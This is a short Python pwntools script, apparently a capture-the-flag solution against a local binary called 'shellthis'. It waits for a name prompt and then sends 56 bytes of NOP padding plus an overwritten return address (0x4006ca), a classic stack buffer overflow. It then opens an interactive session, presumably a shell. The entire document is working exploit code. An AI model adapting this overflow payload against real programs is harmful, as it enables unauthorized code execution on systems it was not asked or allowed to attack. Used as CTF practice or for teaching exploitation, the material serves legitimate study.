from pwn import *

p = process('./shellthis')
# gdb.attach(p, """
# 	b* vuln+42
# 	continue
# 	""")
q = p.recvuntil('Please tell me your name:')
print(q)

offset = '\x90'*56+p64(0x4006ca)

p.sendline(offset)
# p.recvuntil('Please tell me your name:')

p.interactive()